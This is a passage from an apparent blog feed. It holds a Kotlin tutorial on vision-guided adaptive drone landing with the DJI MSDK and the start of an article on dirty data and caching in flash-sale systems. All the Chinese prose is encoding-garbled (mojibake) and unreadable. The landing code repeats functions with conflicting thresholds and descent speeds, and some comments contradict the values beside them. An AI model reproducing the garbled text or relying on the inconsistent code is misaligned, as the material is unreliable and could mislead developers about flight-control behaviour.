<li><strong>GPSç²¾åº¦æé</strong>(Â±3ç±³),ä¸å¤ç²¾ç¡®ã</li>
<li><strong>é£åå½±å</strong>,ææ¶ååé£çå½±åï¼æ äººæºä¼åç¦»ã</li>
</ol>
<h4 id="è§£å³æ¹æ¡è§è§è¯å«ä½ç½®è°æ´">è§£å³æ¹æ¡:è§è§è¯å«+ä½ç½®è°æ´</h4>
<p><strong>å·¥ä½åç:</strong></p>
<ol>
<li>æ äººæºæåå¤´è¯å«å°é¢ç<strong>ç¹å®å¾å</strong>(å¦äºç»´ç ãæ è®°ç¹)</li>
<li>è§è§ç®æ³è®¡ç®<strong>åç§»é</strong>(Xè½´å·¦å³,Yè½´åå,Zè½´è·å¾åè·ç¦»)</li>
<li>å°åç§»éä¼ ç»æ äººæº</li>
<li>æ äººæºè°æ´ä½ç½®,è¾¹éè½è¾¹å¯¹å</li>
</ol>
<p><strong>æ°æ®ç»æ:</strong></p>
<pre><code class="language-kotlin">private var xOffset: Double = 0.0  // Xè½´åç§»(ç±³),æ­£=å³,è´=å·¦
private var yOffset: Double = 0.0  // Yè½´åç§»(ç±³),æ­£=å,è´=å
private var zDistance: Double = 0.0 // Zè½´è·ç¦»(ç±³),è·éè½ç¹é«åº¦
</code></pre>
<p><strong>å¤é¨æ¥å£:</strong></p>
<pre><code class="language-kotlin">// è§è§è¯å«ç³»ç»è°ç¨è¿äºæ¹æ³æ´æ°åç§»é(~1Hz)
fun setXOffset(offset: Double) { xOffset = offset }
fun setYOffset(offset: Double) { yOffset = offset }
fun setZDistance(distance: Double) { zDistance = distance }
</code></pre>
<h4 id="éç¨èªéåºç­ç¥ä¸è¾¹éè½ä¸éè°æ´">éç¨èªéåºç­ç¥ï¼ä¸è¾¹éè½ä¸éè°æ´</h4>
<p><strong>å³é®ç¹:</strong><br>
å¨ä¸åçé«åº¦ï¼æä»¬åè®¸çåç§»ééå¼ä¸åçï¼é«åº¦è¾é«çæ¶åï¼åç§»éå°±ç®æ¯è¾å¤§ä¹å¯ä»¥ä¸éï¼éçé«åº¦éä½ï¼æä»¬åè®¸çåç§»ééå¼ä¼ä¸æ­ç¼©å°ï¼è¦æ±è¶æ¥è¶åä¸­é´å¯¹é½ï¼</p>
<p>çå®åç§»è¶åºåç§»ééå¼ç2åå°±åæ­¢ä¸éï¼åªè¿è¡å¯¹é½è°æ´ï¼<br>
çå®åç§»è¶åºåç§»éç1åï¼å°±ä»¥0.1m/sçæ¢éä¸è¾¹éè½ä¸è¾¹è°æ´ï¼<br>
å¨åç§»éèå´åï¼ä¸é«åº¦&gt; 20mï¼ä»¥0.5m/sçéåº¦å¿«éä¸éï¼<br>
å¨åç§»éèå´åï¼ä¸é«åº¦å¨5m-20mä¹é´ï¼ä»¥0.2m/sçéåº¦ä¸éï¼<br>
å¨åç§»éèå´åï¼ä¸é«åº¦&lt; 5mï¼ä»¥0.2m/séåº¦ä¸éï¼</p>
<p><strong>å®ç°:</strong></p>
<pre><code class="language-kotlin">// 1. æ ¹æ®é«åº¦å¨æè®¡ç®åè®¸çè¯¯å·®
private fun getOffsetThreshold(altitude: Double): Double {
    return when {
        altitude &gt; 50.0 -&gt; 1.0   // é«ç©º:åè®¸1ç±³åç§»è¯¯å·®
        altitude &gt; 20.0 -&gt; 0.5   // ä¸­ç©º:åè®¸0.5ç±³åç§»è¯¯å·®
        altitude &gt; 5.0  -&gt; 0.3   // ä½ç©º:åè®¸0.3ç±³åç§»è¯¯å·®
        else -&gt; 0.2              // æä½ç©º:è¦æ±0.2ç±³ç²¾åº¦
    }
}

// 2. æ ¹æ®é«åº¦ååç§»éå¨æè®¡ç®ä¸ééåº¦
private fun getDescentSpeed(altitude: Double, xOffset: Double, yOffset: Double): Double {
    val threshold = getOffsetThreshold(altitude)
    return when {
        xOffset &gt; threshold * 2 || yOffset &gt; threshold * 2 -&gt; 0.0  // åç§»å¤ªå¤§:åæ­¢ä¸é
        xOffset &gt; threshold || yOffset &gt; threshold -&gt; 0.1          // åç§»è¾å¤§:æ¢é
        altitude &gt; 20.0 -&gt; 0.5                                     // ä¸­é«ç©º:å¿«é
        altitude &gt; 5.0  -&gt; 0.2                                     // ä½ç©º:æ¢é
        else -&gt; 0.2                                                // æä½ç©º:ææ¢é
    }
}
</code></pre>
<p><strong>æ§å¶é»è¾:</strong></p>
<div class="mermaid">graph TD
    A[è·åå½åé«åº¦ååç§»é] --&gt; B{é«åº¦å¤æ­}
    B --&gt;|å¤§äº50m| C[åç¦»éå¼1m]
    B --&gt;|20-50m| D[åç¦»éå¼0.5m]
    B --&gt;|5-20m| E[åç¦»éå¼0.3m]
    B --&gt;|å°äº5m| F[åç¦»éå¼0.2m]
    C --&gt; G{åç§»å¤æ­}
    D --&gt; G
    E --&gt; G
    F --&gt; G
    G --&gt;|åç§»å¤§äºéå¼ç2å| H[åæ­¢ä¸é,åªè°æ´]
    G --&gt;|åç§»å¤§äºéå¼| I[æ¢é0.1m/så¹¶ä¸è°æ´]
    G --&gt;|åç§»å°äºéå¼| J[å¿«éå¹¶ä¸å¾®è°]
    H --&gt; K[åéèææææä»¤]
    I --&gt; K
    J --&gt; K
    K --&gt; L{é«åº¦å°äºç­äº0.1m?}
    L --&gt;|å¦| A
    L --&gt;|æ¯| M[çéå®æ]
</div><h3 id="ç¬¬åæ­¥å¤çé¿ééè½ååæ¡¨">ç¬¬åæ­¥:å¤çé¿éï¼éè½ååæ¡¨ã</h3>
<h4 id="é®é¢ä¸è§é¿éä¼é»æ­¢éè½">é®é¢:ä¸è§é¿éä¼é»æ­¢éè½</h4>
<p>æ äººæºçä¸è§é¿éç³»ç»ä¼å°å°é¢è¯å«ä¸ºéç¢ç©,å¨æ¥è¿å°é¢æ¶èªå¨åæ­¢ä¸éï¼æä»¬å¨é«åº¦ä¸º5mçæ¶åå³é­ä¸è§é¿éï¼è½å°å°é¢åè°ç¨KeyStartAutoLandingè¿è¡åæ¡¨ã<br>
<strong>åèææ¡£ï¼</strong> <a href="https://sdk-forum.dji.net/hc/zh-cn/articles/14578693771033-%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%99%9A%E6%8B%9F%E6%91%87%E6%9D%86%E9%99%8D%E8%90%BD" target="_blank" rel="noopener nofollow">https://sdk-forum.dji.net/hc/zh-cn/articles/14578693771033-å¦ä½ä½¿ç¨èæææéè½</a></p>
<h4 id="ä½ç©ºæ¶å³é­ä¸è§é¿é">ä½ç©ºæ¶å³é­ä¸è§é¿é</h4>
<pre><code class="language-kotlin">var downwardObstacleDisabled = false  //ç¡®ä¿å³é­ä¸è§é¿éæä½åªæåæ§è¡ä¸æ¬¡

// é«åº¦&lt;5mæ¶å³é­ä¸è§é¿é
if (currentAltitude &lt;= 5.0 &amp;&amp; !downwardObstacleDisabled) {
    downwardObstacleDisabled = true
    setObstacleAvoidanceEnable(false, PerceptionDirection.DOWNWARD)
}



//å³é­ä¸è§é¿éè°ç¨æ¹æ³
 private fun setObstacleAvoidanceEnable(enabled: Boolean,direction: PerceptionDirection){
        if (direction == null) {
            Log.e("Perception", "æ¹ååæ°ä¸ºç©ºï¼æ æ³è®¾ç½®é¿é")
            return
        }
        PerceptionManager.getInstance().setObstacleAvoidanceEnabled(    //è°ç¨å¤§çMSDKæ¹æ³å³é­ä¸è§é¿é
            enabled,
            direction,
            object : CommonCallbacks.CompletionCallback {
                override fun onSuccess() {
                    toastResult?.postValue(DJIToastResult.success(
                        "æåè®¾ç½®ã${direction.name}ãæ¹åçé¿éä¸ºï¼${if (enabled) "å¼å¯" else "å³é­"}")
                    )
                    Log.i(
                        "Perception",
                        "æåè®¾ç½®ã${direction.name}ãæ¹åçé¿éä¸ºï¼${if (enabled) "å¼å¯" else "å³é­"}"
                    )
                }
                override fun onFailure(error: IDJIError) {
                    downwardObstacleDisabled = false
                    toastResult?.postValue(DJIToastResult.failed(
                        "è®¾ç½®ã${direction.name}ãæ¹åçé¿éå¤±è´¥ï¼$error"
                    ))
                    Log.e(
                        "Perception",
                        "è®¾ç½®ã${direction.name}ãæ¹åçé¿éå¤±è´¥ï¼$error"
                    )
                }
            }
        )
    }
</code></pre>
<hr>
<h3 id="ç¬¬äºæ­¥éè½å¾ªç¯å®æ´é»è¾">ç¬¬äºæ­¥:éè½å¾ªç¯å®æ´é»è¾</h3>
<pre><code class="language-kotlin">private fun startDynamicAdjustment() {
    isAdjusting = true
    virtualStickHandler = Handler(Looper.getMainLooper())
    
    val adjustTask = object : Runnable {
        override fun run() {
            if (!isAdjusting) return
            
            // 1. è·åå½åç¶æ
            val currentAltitude = FlightControllerKey.KeyAltitude.create().get(0.0)
            val currentXOffsetAbs = Math.abs(xOffset)
            val currentYOffsetAbs = Math.abs(yOffset)
            
            // 2. æ£æ¥æ¯å¦çé
            if (currentAltitude &lt;= 0.1) {
                stopLanding()
                return
            }
            
            // 3. ä½ç©ºæ¶å³é­ä¸è§é¿é
            if (currentAltitude &lt;= 5.0 &amp;&amp; !downwardObstacleDisabled) {
                downwardObstacleDisabled = true
                setObstacleAvoidanceEnable(false, PerceptionDirection.DOWNWARD)
            }
            
            // 4. è®¡ç®èªéåºåæ°
            val offsetThreshold = getOffsetThreshold(currentAltitude)
            val descentSpeed = getDescentSpeed(currentAltitude, currentXOffsetAbs, currentYOffsetAbs)
            
            // 5. æå»ºèææææä»¤
            val adjustParam = VirtualStickFlightControlParam().apply {
                rollPitchCoordinateSystem = FlightCoordinateSystem.BODY
                verticalControlMode = VerticalControlMode.VELOCITY
                rollPitchControlMode = RollPitchControlMode.VELOCITY
                
                // æ°´å¹³è°æ´
                roll = if (currentXOffsetAbs &gt; offsetThreshold) {
                    if (xOffset &gt; 0) ADJUSTMENT_SPEED else -ADJUSTMENT_SPEED
                } else 0.0
                
                pitch = if (currentYOffsetAbs &gt; offsetThreshold) {
                    if (yOffset &gt; 0) ADJUSTMENT_SPEED else -ADJUSTMENT_SPEED
                } else 0.0
                
                // åç´ä¸é
                verticalThrottle = -descentSpeed
            }
            
            // 6. åéæä»¤
            VirtualStickManager.getInstance().sendVirtualStickAdvancedParam(adjustParam)
            
            // 7. 100msååæ¬¡æ§è¡(10Hz)
            virtualStickHandler?.postDelayed(this, 100)
        }
    }
    
    virtualStickHandler?.post(adjustTask)
}
</code></pre>
<p><strong>ä»¥ä¸ï¼å°±å®ç°äºä¸æ´å¥è§è§å¼å¯¼çèªéåºéè½æ¹æ¡</strong></p>
<h4 id="å®å¨æ³¨æäºé¡¹">å®å¨æ³¨æäºé¡¹</h4>
<p><strong>WARNING</strong></p>
<ol>
<li>å¿é¡»å¨ç©ºæ·ãå®å¨ç¯å¢æµè¯</li>
<li>å»ºè®®åç¨DJIæ¨¡æå¨æµè¯</li>
<li>è§è§è¯å«å¿é¡»æç»­æ´æ°(~1Hz)</li>
<li>åå¤å¥½éæ¶æå¨æ¥ç®¡</li>
</ol>
<h4 id="ä»£ç ">ä»£ç </h4>
<pre><code class="language-kotlin"> /**
     * One-key return to vehicle function (using Virtual Stick instead of FlyTo)
     * 1. Get aircraft current location
     * 2. Calculate distance to vehicle using Haversine formula
     * 3. If distance &gt; 500m, reject with error
     * 4. Use Virtual Stick to navigate to vehicle location
     * 5. Switch to precision adjustment when close enough
     */
    fun returnToVehicle(callback: CommonCallbacks.CompletionCallback) {
        // Get aircraft current location
        val aircraftLocation = getAircraftLocation()
        if (aircraftLocation == null || !isLocationValid(aircraftLocation.latitude, aircraftLocation.longitude)) {
            callback.onFailure(DJICommonError.FACTORY.build("æ æ³è·åæ äººæºä½ç½®ä¿¡æ¯"))
            return
        }
        
        // Vehicle coordinates (hardcoded for now, will be replaced with API later)
        // TODO: Replace with actual vehicle GPS coordinates from API
        val vehicleLatitude = 22.579  // Example coordinates
        val vehicleLongitude = 113.941 // Example coordinates
        
        // Calculate distance using Haversine formula
        val distance = calculateDistance(
            aircraftLocation.latitude,
            aircraftLocation.longitude,
            vehicleLatitude,
            vehicleLongitude
        )
        
        // Distance validation: reject if &gt; 500m
        if (distance &gt; 500) {
            callback.onFailure(DJICommonError.FACTORY.build(
                "è·ç¦»è¿è¿: ${String.format("%.2f", distance)}m, è¶åº 500m éå¶"
            ))
            return
        }
        
        // Start virtual stick navigation to vehicle location
        toastResult?.postValue(DJIToastResult.success("å¼å§é£åè½¦è¾ä½ç½®"))
        //TODO è¿ä¸ªtargetAltéè¦åæç»è¿è®¡ç®ç®åºæ¥ã
        navigateToTarget(vehicleLatitude, vehicleLongitude, 100.0, callback)
    }
    
    
      /**
     * Navigate to target location using Virtual Stick
     */
    private fun navigateToTarget(
        targetLat: Double,
        targetLon: Double,
        targetAlt: Double,
        callback: CommonCallbacks.CompletionCallback
    ) {
        VirtualStickManager.getInstance().enableVirtualStick(object : CommonCallbacks.CompletionCallback {
            override fun onSuccess() {
                VirtualStickManager.getInstance().setVirtualStickAdvancedModeEnabled(true)
                isNavigating = true
                startNavigation(targetLat, targetLon, targetAlt, callback)
            }
            override fun onFailure(error: IDJIError) {
                callback.onFailure(error)
            }
        })
    }
    
     /**
     * Start navigation loop using Virtual Stick
     */
    private fun startNavigation(
        targetLat: Double,
        targetLon: Double,
        targetAlt: Double,
        callback: CommonCallbacks.CompletionCallback
    ) {
        virtualStickHandler = Handler(Looper.getMainLooper())
        
        val navTask = object : Runnable {
            override fun run() {
                if (!isNavigating) {
                    return
                }
                
                val currentLoc = getAircraftLocation()
                if (currentLoc == null) {
                    virtualStickHandler?.postDelayed(this, 100)
                    return
                }
                
                // Calculate remaining distance
                val remainingDistance = calculateDistance(
                    currentLoc.latitude,
                    currentLoc.longitude,
                    targetLat,
                    targetLon
                )
                println("targetLat:"+targetLat+" targetLon:"+targetLon+" currentLoc.latitude:"+currentLoc.latitude+" currentLoc.longitude:"+currentLoc.longitude+" remainingDistance:"+remainingDistance)

                
                // Check if arrived
                if (remainingDistance &lt; ARRIVAL_THRESHOLD) {
                    // Arrived at target, stop navigation
                    isNavigating = false
                    virtualStickHandler?.removeCallbacksAndMessages(null)
                    callback.onSuccess()
                    toastResult?.postValue(DJIToastResult.success("å·²å°è¾¾è½¦è¾ä½ç½®,å¼å§ç²¾ç¡®å®ä½"))
                    //å¼å§è°èäºå°è§åº¦,ä¿¯ä»°è§ä¸º-90Â°ï¼æè½¬æ¶é´1s
                    startGimbalAngleRotation(GimbalAngleRotationMode.ABSOLUTE_ANGLE,-90.0,0.0,0.0,1.0)
                    // Start precision adjustment
                    startDynamicAdjustment()
                } else {
                    // Continue navigation
                    val bearing = calculateBearing(
                        currentLoc.latitude,
                        currentLoc.longitude,
                        targetLat,
                        targetLon
                    )
                    
                    val navParam = VirtualStickFlightControlParam().apply {
                        rollPitchCoordinateSystem = FlightCoordinateSystem.GROUND  // Use ground coordinate system
                        verticalControlMode = VerticalControlMode.POSITION
                        yawControlMode = YawControlMode.ANGLE
                        rollPitchControlMode = RollPitchControlMode.VELOCITY
                        
                        // Calculate velocity components based on bearing
                        val bearingRad = Math.toRadians(bearing)
                        pitch = NAVIGATION_SPEED * Math.sin(bearingRad)  // North-South component
                        roll = NAVIGATION_SPEED * Math.cos(bearingRad)   // East-West component
                        yaw = bearing  // Point towards target
                        verticalThrottle = targetAlt  // Target altitude
                    }
                    
                    VirtualStickManager.getInstance().sendVirtualStickAdvancedParam(navParam)
                    virtualStickHandler?.postDelayed(this, 100)
                }
            }
        }
        
        virtualStickHandler?.post(navTask)
    }
    
    
    fun startGimbalAngleRotation(mode: GimbalAngleRotationMode,pitch: Double,yaw: Double,roll: Double,duration: Double){

        val rotation = GimbalAngleRotation().apply {
            setMode(mode)
            setPitch(pitch)
            setYaw(yaw)
            setRoll(roll)
            setDuration(duration)
        }

        KeyManager.getInstance().performAction(
            KeyTools.createKey(GimbalKey.KeyRotateByAngle),
            rotation,
            object: CommonCallbacks.CompletionCallbackWithParam&lt;EmptyMsg&gt;{
                override fun onSuccess(result: EmptyMsg?) {
                    toastResult?.postValue(DJIToastResult.success("äºå°æè½¬æå"))
                    Log.i("Gimbal","äºå°æè½¬æåï¼yaw:${rotation.yaw},pitch:${rotation.pitch},roll:${rotation.roll}")
                }

                override fun onFailure(error: IDJIError) {
                    toastResult?.postValue(DJIToastResult.failed("äºå°æè½¬å¤±è´¥,$error"))
                    Log.e("Gimbal","äºå°æè½¬å¤±è´¥ï¼$error")
                }
            }
        )

    }
    
    /**
     * Start dynamic position adjustment loop with adaptive descent
     * Adjusts position while descending, with stricter requirements at lower altitudes
     */
    private fun startDynamicAdjustment() {
        isAdjusting = true
        virtualStickHandler = Handler(Looper.getMainLooper())
        
        // Send adjustment commands at 10Hz
        val adjustTask = object : Runnable {
            override fun run() {
                if (!isAdjusting) {
                    return
                }
                
                // TODO è·åèæ¬æ£æµåºçzè½´è·ç¦»
                val currentAltitude = FlightControllerKey.KeyAltitude.create().get(0.0)
                val currentXOffsetAbs = Math.abs(xOffset)
                val currentYOffsetAbs = Math.abs(yOffset)
                //å³é­éè½ä¿æ¤ï¼ä¸è§é¿éå¤±æ
                if(currentAltitude &lt;= 5 &amp;&amp; !downwardObstacleDisabled){
                    downwardObstacleDisabled = true
                    setObstacleAvoidanceEnable(false, PerceptionDirection.DOWNWARD)
                }
                // æ£æ¥æ¯å¦è½å°
                if (currentAltitude &lt;= 0.1) {
                    stopLanding()
                    return
                }
                
                // Get adaptive thresholds based on altitude
                val offsetThreshold = getOffsetThreshold(currentAltitude)
                val descentSpeed = getDescentSpeed(currentAltitude, currentXOffsetAbs,currentYOffsetAbs)
                
                // Log for debugging
                println("èªå¨è°æ´ - é«åº¦:%.2fm, xåç§»:%.2fm,yåç§»:%.2fm, éå¼:%.2fm, ä¸ééåº¦:%.2fm/s".format(
                    currentAltitude, currentXOffsetAbs,currentYOffsetAbs,offsetThreshold, descentSpeed
                ))
                
                // Calculate adjustment parameters
                val adjustParam = VirtualStickFlightControlParam().apply {
                    rollPitchCoordinateSystem = FlightCoordinateSystem.BODY
                    verticalControlMode = VerticalControlMode.VELOCITY
                    yawControlMode = YawControlMode.ANGULAR_VELOCITY
                    rollPitchControlMode = RollPitchControlMode.ANGLE
                    
                    // Calculate roll value based on offset
                    // Positive offset (need to move forward) -&gt; positive roll
                    // Negative offset (need to move backward) -&gt; negative roll
                    if (currentXOffsetAbs &gt; offsetThreshold) {
                        // Need adjustment
                        roll = if (xOffset &gt; 0) ADJUSTMENT_SPEED else -ADJUSTMENT_SPEED
                    } else {
                        // Within threshold, no adjustment needed
                        roll = 0.0
                    }
                    if (currentYOffsetAbs &gt; offsetThreshold) {
                        pitch = if(yOffset &gt; 0) ADJUSTMENT_SPEED else -ADJUSTMENT_SPEED
                    } else {
                        pitch = 0.0
                    }
                    yaw = 0.0
                    verticalThrottle = -descentSpeed  // Descend at adaptive speed
                }
                
                VirtualStickManager.getInstance().sendVirtualStickAdvancedParam(adjustParam)
                virtualStickHandler?.postDelayed(this, 100)
            }
        }
        
        virtualStickHandler?.post(adjustTask)
        toastResult?.postValue(DJIToastResult.success("å¼å§å¨æä½ç½®è°æ´"))
    }
    
    /**
     * Stop landing and cleanup
     */
    private fun stopLanding() {
        virtualStickHandler?.removeCallbacksAndMessages(null)
        //è°ç¨KeyStartAutoLandingè¿è¡åæ¡¨
        FlightControllerKey.KeyStartAutoLanding.create().action({
            toastResult?.postValue(DJIToastResult.success("æ¡¨å¶å¨åå³é­"))
            Log.i("stopLanding","æ¡¨å¶å¨åå³é­æå")
        },{
            toastResult?.postValue(DJIToastResult.failed("æ¡¨å¶å¨åå³é­å¤±è´¥"))
            Log.i("stopLanding","æ¡¨å¶å¨åå³é­å¤±è´¥ï¼ï¼")
        })
        cleanupVirtualStick()
        toastResult?.postValue(DJIToastResult.success("éè½å®æ"))
    }
    
    
    /**
     * Get offset threshold based on current altitude
     * Higher altitude allows larger offset, lower altitude requires stricter precision
     */
    private fun getOffsetThreshold(altitude: Double): Double {
        return when {
            altitude &gt; HIGH_ALTITUDE -&gt; 1.0   // High altitude: allow 1m offset
            altitude &gt; MID_ALTITUDE -&gt; 0.5    // Mid altitude: allow 0.5m offset
            altitude &gt; LOW_ALTITUDE -&gt; 0.4    // Low altitude: allow 0.3m offset
            else -&gt; 0.3                       // Very low altitude: require 0.2m precision
        }
    }
    
    /**
     * Get descent speed based on current altitude and offset
     * Larger offset or lower altitude results in slower descent
     */
    private fun getDescentSpeed(altitude: Double, xOffset: Double,yOffset: Double): Double {
        val threshold = getOffsetThreshold(altitude)
        return when {
            xOffset &gt; threshold * 2 || yOffset &gt; threshold * 2 -&gt; 0.0      // Offset too large: stop descending
            xOffset &gt; threshold || yOffset &gt; threshold -&gt; 0.1          // Offset large: slow descent
            altitude &gt; MID_ALTITUDE -&gt; 0.5     // Mid-high altitude: fast descent
            altitude &gt; LOW_ALTITUDE -&gt; 0.2     // Low altitude: slow descent
            else -&gt; 0.1                        // Very low altitude: very slow descent
        }
    }
</code></pre>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2025-12-31 15:25">2025-12-31 15:24</span>&nbsp;
<a href="https://www.cnblogs.com/foury">æ·±ç´«è²çä¸åå­å·</a>&nbsp;
éè¯»(<span id="post_view_count">152</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19426887);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19426887', targetLink: 'https://www.cnblogs.com/foury/p/19426887', title: 'åºäºå¤§çMSDKå®ç°çæ äººæºè§è§å¼å¯¼èªéåºéè½åè½' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ é«å¹¶åç§æåºæ¯ä¸çèæ°æ®ä¸åç¼å­æºå¶è§£æ ]]></title>
    <link>https://www.cnblogs.com/beggars/p/19426884</link>
    <guid>2d22888754c2afa3ae1605c75bfe851a</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/beggars/p/19426884" title="åå¸äº 2025-12-31 15:24">
    <span role="heading" aria-level="2">é«å¹¶åç§æåºæ¯ä¸çèæ°æ®ä¸åç¼å­æºå¶è§£æ</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h1 id="é«å¹¶åç§æåºæ¯ä¸çèæ°æ®ä¸åç¼å­æºå¶è§£æ">é«å¹¶åç§æåºæ¯ä¸çèæ°æ®ä¸åç¼å­æºå¶è§£æ</h1>
<h1 id="ä¸ææ¡£æ¦è¿°">ä¸ãææ¡£æ¦è¿°</h1>
<p>æ¬ææ¡£èç¦é«å¹¶åç§æåºæ¯ï¼è¯¦ç»è§£æâèæ°æ®âåâåç¼å­æºå¶âä¸¤ä¸ªæ ¸å¿æ¦å¿µï¼æç¡®èæ°æ®çå®ä¹ãäº§çåå åè§£å³æ¹æ¡ï¼éè¿°åç¼å­æºå¶çè®¾è®¡æè·¯ãå®ç°æ¹å¼åå¨ç§æåºæ¯ä¸­çæ ¸å¿ä»·å¼ï¼æç»ç»å Redis+MySQL å¼æ­¥æ¶æï¼ç»åºä¸¤èçååè½å°æ¹æ¡ï¼å©åä¿éç³»ç»æ°æ®ä¸è´æ§ä¸é«å¹¶åè¯»åæ§è½ã</p>
<p>éç¨èå´ï¼ç§æç³»ç»å¼åäººåãéè¦è§£å³é«å¹¶åæ°æ®ä¸è´æ§é®é¢çåç«¯å¼åè</p>
<p>åç½®å³èï¼æ¬ææ¡£åå®¹åºäºâRedis åç½®æå¹¶å + MySQL å¼æ­¥è½åºâçç§ææ¶æï¼å¯¹åºåææ ¸å¿æµç¨ï¼</p>
<h1 id="äºèæ°æ®è¯¦è§£">äºãèæ°æ®è¯¦è§£</h1>
<h2 id="21-å®ä¹">2.1 å®ä¹</h2>
<p>èæ°æ®æ¯ææ°æ®å¨å¤çãä¼ è¾æå­å¨è¿ç¨ä¸­ï¼åºç°ç <strong>æªç¡®è®¤çä¸­é´ç¶ææ°æ®</strong> æ<strong>ä¸åå­å¨ç³»ç»é´çä¸´æ¶ä¸ä¸è´æ°æ®</strong>ãè¿äºæ°æ®å¹¶éæç»ç¡®è®¤çæææ°æ®ï¼è¥è¢«ä¸å¡è¯»åæä½¿ç¨ï¼ä¼å¯¼è´ä¸å¡é»è¾å¼å¸¸ï¼å¦è¶åãè®¢åéè¯¯ãç»è®¡åå·®ç­ï¼ã</p>
<p>æ ¸å¿ç¹å¾ï¼æ°æ®âä¸´æ¶ä¸æ­£ç¡®âï¼å¯è½æ¯ç­æåå·®ï¼ä¹å¯è½æ¯æ°¸ä¹éè¯¯ï¼éäººå·¥ä»å¥ï¼ã</p>
<h2 id="22-ç§æåºæ¯ä¸­çèæ°æ®è¡¨ç°">2.2 ç§æåºæ¯ä¸­çèæ°æ®è¡¨ç°</h2>
<p>å¨ Redis+MySQL å¼æ­¥è½åºçç§ææ¶æä¸­ï¼èæ°æ®ä¸»è¦æºäºâRedis åæ´æ°ãMySQL ååæ­¥âçæ¶é´å·®ï¼å¸¸è§è¡¨ç°æ 3 ç±»ï¼</p>
<h3 id="221-redis-ä¸-mysql-åºå­ä¸ä¸è´æå¸¸è§">2.2.1 Redis ä¸ MySQL åºå­ä¸ä¸è´ï¼æå¸¸è§ï¼</h3>
<ul>
<li>
<p><strong>åºæ¯ 1</strong>ï¼ç¨æ·ç§ææåï¼Redis åºå­å·²æ£åï¼ä½æ¶æ¯éåå»¶è¿/æ¶è´¹èæéï¼å¯¼è´ MySQL åºå­æªåæ¶æ´æ°ã</p>
</li>
<li>
<p><strong>è¡¨ç°</strong>ï¼ç¨æ·çå°ç§ææåï¼ä½ç®¡çåå°æ¥è¯¢ MySQL åºå­ä»ä¸ºæ§å¼ï¼è¥æ­¤æ¶æå¶ä»ä¾èµ MySQL åºå­çä¸å¡ï¼å¦æå¨è¡¥è´§ï¼ï¼ä¼åºäºéè¯¯åºå­å³ç­ã</p>
</li>
<li>
<p><strong>åºæ¯ 2</strong>ï¼åå°è¿è¥æå¨è°æ´ MySQL åºå­ï¼å¦ç´§æ¥å è´§ï¼ï¼ä½æªåæ­¥æ´æ° Redis ç¼å­ã</p>
</li>
<li>
<p><strong>è¡¨ç°</strong>ï¼ç¨æ·ç§ææ¶ï¼Redis è¿åçä»æ¯æ§åºå­ï¼å¦å·²æ¾ç¤ºå®ç½ï¼ï¼å¯¼è´çå®åºå­æ æ³è¢«æ¢è´­ï¼é æèµæºæµªè´¹ã</p>
</li>
</ul>
<h3 id="222-æªæäº¤äºå¡çæ°æ®è¢«è¯»å">2.2.2 æªæäº¤äºå¡çæ°æ®è¢«è¯»å</h3>
<ul>
<li>
<p><strong>åºæ¯</strong>ï¼MySQL æ¶è´¹èå¨äºå¡ä¸­æ§è¡âæ£åºå­+åå»ºè®¢åâï¼ä½äºå¡æªæäº¤ï¼å¦ç­å¾å¶ä»èµæºï¼ï¼æ­¤æ¶å¶ä»æ¥è¯¢è¯·æ±è¯»åå°è¯¥æªç¡®è®¤çåºå­/è®¢åæ°æ®ã</p>
</li>
<li>
<p><strong>è¡¨ç°</strong>ï¼è¯»åå°ä¸´æ¶çâå·²æ£ååºå­âæâæªç¡®è®¤è®¢åâï¼è¥åç»­äºå¡åæ»ï¼è¿äºæ°æ®ä¼æ¶å¤±ï¼å¯¼è´ä¸å¡é»è¾æ··ä¹±ã</p>
</li>
</ul>
<h3 id="223-éå¤ç§æå¯¼è´çéå¤è®¢åæ°æ®">2.2.3 éå¤ç§æå¯¼è´çéå¤è®¢åæ°æ®</h3>
<ul>
<li>
<p><strong>åºæ¯</strong>ï¼Redis ä¸­âç¨æ·å·²ç§æâæ è®°å è¿æ/æªåå¥æåï¼å¯¼è´åä¸ç¨æ·éå¤ç§æï¼çæå¤ä¸ªè®¢åã</p>
</li>
<li>
<p><strong>è¡¨ç°</strong>ï¼MySQL ä¸­åºç°åä¸ç¨æ·å¯¹åä¸ååçå¤æ¡ç§æè®¢åï¼è§¦åè¶åæéæ¬¾çº çº·ã</p>
</li>
</ul>
<h2 id="23-èæ°æ®äº§ççæ ¸å¿åå ">2.3 èæ°æ®äº§ççæ ¸å¿åå </h2>
<ol>
<li>
<p><strong>å¼æ­¥æ´æ°çæ¶é´å·®</strong>ï¼Redis ä¸ MySQL å¹¶éå®æ¶åæ­¥ï¼ä¸­é´éè¿æ¶æ¯éåè¡æ¥ï¼å­å¨ä¸å¯é¿åçå»¶è¿ã</p>
</li>
<li>
<p><strong>ç¼å­ç­ç¥ä¸åç</strong>ï¼ç¼å­è¿ææ¶é´è®¾ç½®ä¸å½ãæ´æ°ç¼å­æ¶éæ¼ï¼å¦æå¨æ¹ MySQL æªæ´ Redisï¼ãç¼å­ç©¿é/å»ç©¿å¯¼è´çæ°æ®åºç´æ¥è¯»åã</p>
</li>
<li>
<p><strong>å¹¶åäºå¡å²çª</strong>ï¼MySQL äºå¡éç¦»çº§å«è¿ä½ï¼å¦ Read Uncommittedï¼ï¼å¯¼è´æªæäº¤æ°æ®è¢«å¶ä»äºå¡è¯»åã</p>
</li>
<li>
<p><strong>ç³»ç»æé/å¼å¸¸</strong>ï¼æ¶æ¯éåå ç§¯/å®æºãæ¶è´¹èè¿ç¨å´©æºãRedis ç¼å­å¤±æ/éç¾¤æéã</p>
</li>
<li>
<p><strong>ä¸å¡é»è¾æ¼æ´</strong>ï¼æªåå¥½âç¨æ·éå¤ç§æâç Redis æ è®°æ ¡éªãåºå­æ£åæªååéæ ¡éªã</p>
</li>
</ol>
